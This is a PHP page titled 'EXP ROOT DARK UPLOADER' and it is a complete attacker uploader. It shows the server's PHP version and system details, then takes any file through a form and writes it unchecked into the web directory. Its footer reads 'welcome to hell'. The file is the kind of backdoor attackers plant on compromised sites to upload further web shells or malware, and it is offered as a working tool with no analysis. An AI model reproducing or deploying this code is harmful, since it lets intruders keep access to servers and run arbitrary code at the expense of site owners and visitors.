<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>EXP ROOT DARK | Uploader</title>

  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Poppins', sans-serif;
      background: #000;
      height: 100vh;
      overflow: hidden;
      color: #00ffcc;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      position: relative;
    }

    /* خلفية البرق */
    .lightning {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      z-index: 0;
      pointer-events: none;
      background: #fff;
      opacity: 0;
      animation: flash 7s infinite;
    }

    @keyframes flash {
      0%, 97%, 100% { opacity: 0; }
      98% { opacity: 0.2; }
      98.2% { opacity: 0.8; }
      98.4% { opacity: 0.1; }
      98.6% { opacity: 0.5; }
      98.8% { opacity: 0; }
    }

    .logo {
      z-index: 2;
      animation: float 3s ease-in-out infinite;
      margin-bottom: 20px;
    }

    .logo img {
      width: 180px;
      border-radius: 20px;
      box-shadow: 0 0 30px #00ffcc88;
    }

    @keyframes float {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }

    .container {
      position: relative;
      z-index: 1;
      background: rgba(0, 0, 0, 0.65);
      padding: 30px;
      border-radius: 20px;
      border: 1px solid #00ffcc44;
      box-shadow: 0 0 20px #00ffcc55;
      width: 90%;
      max-width: 500px;
      text-align: center;
    }

    .card {
      background: rgba(0, 0, 0, 0.7);
      padding: 15px 20px;
      margin: 10px 0;
      border-radius: 12px;
      border: 1px solid #00ffaa55;
      box-shadow: 0 0 10px #00ffcc44;
      text-align: left;
    }

    .card strong {
      color: #00ffaa;
    }

    h1 {
      font-size: 28px;
      margin-bottom: 15px;
      text-shadow: 0 0 5px #00ffccaa;
    }

    form {
      margin-top: 20px;
    }

    input[type="file"] {
      width: 100%;
      padding: 10px;
      background-color: #00ffcc0a;
      border: 2px dashed #00ffcc33;
      color: #00ffcc;
      border-radius: 8px;
      margin-bottom: 15px;
    }

    input[type="submit"] {
      background: linear-gradient(90deg, #00ffaa, #00ccff);
      color: black;
      font-weight: bold;
      border: none;
      padding: 12px 30px;
      border-radius: 50px;
      cursor: pointer;
      box-shadow: 0 0 10px #00ffcc;
      transition: all 0.3s ease;
    }

    input[type="submit"]:hover {
      background: linear-gradient(90deg, #00cc99, #00aaff);
    }

    .message {
      margin-top: 15px;
      font-weight: bold;
    }

    .success { color: #00e676; }
    .error { color: #ff1744; }

    footer {
      margin-top: 25px;
      font-size: 12px;
      color: #7fffff;
      text-shadow: 0 0 3px #00ffccaa;
    }
  </style>
</head>
<body>

  <div class="lightning"></div>

  <div class="logo">
    <img src="https://e.top4top.io/p_3419n5jxr1.jpg" alt="EXP ROOT DARK Logo">
  </div>

  <div class="container">
    <h1>EXP ROOT DARK UPLOADER</h1>

    <div class="card">
      <strong>PHP Version:</strong> <?php echo phpversion(); ?>
    </div>

    <div class="card">
      <strong>Server Info:</strong> <?php echo php_uname(); ?>
    </div>

    <form method="post" enctype="multipart/form-data">
      <input type="file" name="zb" required>
      <input type="submit" name="upload" value="Upload File">
    </form>

    <?php
    if(isset($_POST['upload'])) {
        if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) {
            echo '<div class="message success">✅ File uploaded successfully.</div>';
        } else {
            echo '<div class="message error">❌ File upload failed.</div>';
        }
    }
    ?>

    <footer>welcome to hell 💀💀 EXP ROOT DARK </footer>
  </div>
</body>
</html>
